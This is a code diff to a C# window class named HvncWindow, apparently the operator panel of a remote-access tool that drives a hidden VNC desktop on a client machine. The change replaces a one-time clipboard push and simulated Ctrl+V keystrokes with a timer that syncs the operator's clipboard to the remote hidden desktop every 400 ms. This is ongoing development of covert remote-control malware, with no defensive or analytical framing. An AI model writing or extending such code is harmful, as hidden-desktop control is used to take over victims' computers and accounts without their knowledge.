@@ -53,6 +53,7 @@ public partial class HvncWindow : Window
         Closed += (_, _) =>
         {
             _closed = true;
+            _clipTimer?.Stop(); _clipTimer = null;
             _server.HvncFrameReceived  -= OnHvncFrame;
             _server.ClientDisconnected -= OnClientDisconnected;
             if (_streaming) SendStop();
@@ -155,39 +156,41 @@ public partial class HvncWindow : Window
         });
     }
 
-    // Push the server clipboard text to the remote hidden desktop
-    private void BtnClipboard_Click(object s, RoutedEventArgs e)
+    // ── Clipboard sync toggle (same pill LED as mouse/keyboard) ──────────────
+    private System.Windows.Threading.DispatcherTimer? _clipTimer;
+    private string _lastClip = "";
+
+    private void ChkClipboard_Checked(object s, RoutedEventArgs e)
     {
+        _lastClip  = "";
+        _clipTimer = new System.Windows.Threading.DispatcherTimer
+            { Interval = TimeSpan.FromMilliseconds(400) };
+        _clipTimer.Tick += ClipSync_Tick;
+        _clipTimer.Start();
+    }
+
+    private void ChkClipboard_Unchecked(object s, RoutedEventArgs e)
+    {
+        _clipTimer?.Stop();
+        _clipTimer = null;
+        _lastClip  = "";
+    }
+
+    private void ClipSync_Tick(object? sender, EventArgs e)
+    {
+        if (_closed) { _clipTimer?.Stop(); return; }
         string text;
         try { text = System.Windows.Clipboard.GetText(); }
-        catch { text = ""; }
-        if (string.IsNullOrEmpty(text)) return;
+        catch { return; }
+        if (string.IsNullOrEmpty(text) || text == _lastClip) return;
+        _lastClip = text;
 
-        // Flash the clipboard button blue to signal success
-        BtnClipboard.Background = new System.Windows.Media.SolidColorBrush(
-            System.Windows.Media.Color.FromRgb(0x4A, 0x85, 0xF5));
-        var restore = BtnClipboard.Background;
-        var t = new System.Windows.Threading.DispatcherTimer { Interval = TimeSpan.FromMilliseconds(500) };
-        t.Tick += (_, _) => { BtnClipboard.Background = System.Windows.Media.Brushes.Transparent; t.Stop(); };
-        t.Start();
-
-        // 1. Send the text to the client's hidden desktop clipboard
+        // Push new clipboard content to the hidden desktop
         _ = _server.SendToClient(_clientId, new Packet
         {
             Type = PacketType.HvncClipboard,
             Data = Newtonsoft.Json.JsonConvert.SerializeObject(new HvncClipboardData { Text = text })
         });
-
-        // 2. Simulate Ctrl+V on the remote desktop so it pastes immediately
-        var ctrlDown = new HvncInputData { T = "kk", VK = 0x11, Down = true  };  // VK_CONTROL
-        var vDown    = new HvncInputData { T = "kk", VK = 0x56, Down = true  };  // V
-        var vUp      = new HvncInputData { T = "kk", VK = 0x56, Down = false };
-        var ctrlUp   = new HvncInputData { T = "kk", VK = 0x11, Down = false };
-
-        SendInput(ctrlDown);
-        SendInput(vDown);
-        SendInput(vUp);
-        SendInput(ctrlUp);
     }
 
     // ── Incoming ──────────────────────────────────────────────────────────────
